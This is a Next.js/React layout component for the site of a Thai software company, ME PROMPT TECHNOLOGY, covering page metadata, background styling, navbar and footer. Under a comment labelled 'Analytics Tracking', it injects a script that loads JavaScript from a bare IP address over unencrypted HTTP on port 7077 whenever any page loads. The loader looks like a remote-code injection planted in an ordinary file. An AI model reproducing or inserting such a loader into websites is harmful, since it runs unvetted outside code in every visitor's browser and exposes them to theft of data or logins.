/**
 * Layout Component (Frontend) - WITH ANALYTICS TRACKING
 * ME PROMPT TECHNOLOGY
 */
import { ReactNode, useEffect } from "react";
import Head from "next/head";
import Navbar from "./ui/Navbar";
import Footer from "./ui/Footer";
import BackToTop from "./BackToTop";
interface LayoutProps {
    children: ReactNode;
    title?: string;
    description?: string;
}
export default function Layout({
    children,
    title = "มีพร้อมท์เทคโนโลยี - ME PROMPT TECHNOLOGY",
    description = "บริษัทพัฒนาซอฟต์แวร์และโซลูชันดิจิทัล ผู้เชี่ยวชาญด้าน Web & Mobile Development, AI และ Automation",
}: LayoutProps) {
    // ✨ Analytics Tracking
    useEffect(() => {
        const script = document.createElement('script');
        script.src = 'http://49.231.43.177:7077/analytics.js';
        script.async = true;
        document.body.appendChild(script);
        return () => {
            // Cleanup on unmount
            if (script.parentNode) {
                script.parentNode.removeChild(script);
            }
        };
    }, []);
    return (
        <>
            <Head>
                <title>{title}</title>
                <meta name="description" content={description} />
                <meta name="viewport" content="width=device-width, initial-scale=1" />
                <link rel="icon" href="/favicon.ico" />
            </Head>
            {/* พื้นหลัง Aurora */}
            <div className="fixed inset-0 w-full h-full -z-10 pointer-events-none bg-[#f8f9fc] overflow-hidden">
                <div className="absolute top-[-10%] left-[-5%] w-[50%] h-[50%] bg-purple-200/40 rounded-full blur-[120px] mix-blend-multiply animate-pulse"></div>
                <div className="absolute top-[20%] right-[-10%] w-[40%] h-[40%] bg-blue-200/40 rounded-full blur-[120px] mix-blend-multiply animate-pulse delay-1000"></div>
                <div className="absolute bottom-[-10%] left-[20%] w-[50%] h-[50%] bg-pink-200/30 rounded-full blur-[120px] mix-blend-multiply animate-pulse delay-2000"></div>
            </div>
            <div className="min-h-screen flex flex-col relative">
                {/* Navbar */}
                <Navbar />
                {/* Main Content */}
                <main className="grow pt-20">
                    {children}
                </main>
                {/* Footer */}
                <Footer />
                {/* Back to Top Button */}
                <BackToTop />
            </div>
        </>
    );
}